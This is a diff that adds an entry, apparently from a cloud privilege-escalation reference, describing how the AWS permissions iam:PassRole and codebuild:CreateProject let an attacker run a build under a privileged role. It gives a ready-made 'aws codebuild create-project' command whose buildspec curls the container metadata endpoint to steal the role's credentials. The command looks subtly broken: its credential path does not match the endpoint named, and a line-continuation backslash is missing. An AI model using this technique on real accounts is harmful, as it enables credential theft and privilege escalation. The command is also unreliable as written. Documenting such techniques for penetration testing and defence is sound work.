@@ -1,0 +1,14 @@
+iam:PassRole + codebuild:CreateProject (+ codebuild:StartBuild)
+
+An attacker with iam:PassRole and codebuild:CreateProject permissions can create a malicious AWS CodeBuild project that executes arbitrary commands using a privileged IAM service role. By embedding commands in the buildspec configuration, the attacker causes the build container to run attacker-controlled code under the permissions of the attached role. Because CodeBuild containers expose temporary role credentials through the container metadata service (169.254.170.2), the attacker can query this endpoint during the build execution to retrieve AWS credentials associated with the service role. These credentials can then be used to perform unauthorized actions across the AWS environment, potentially leading to privilege escalation or data exfiltration.
+
+aws codebuild create-project \
+  --name malicious-build \
+  --source type=NO_SOURCE,buildspec="version: 0.2
+phases:
+  build:
+    commands:
+      - curl http://169.254.170.2/latest/meta-data/iam/security-credentials/"
+  --artifacts type=NO_ARTIFACTS \
+  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:1.0,computeType=BUILD_GENERAL1_SMALL \
+  --service-role arn:aws:iam::<ACCOUNT_ID>:role/<PRIVILEGED_ROLE>
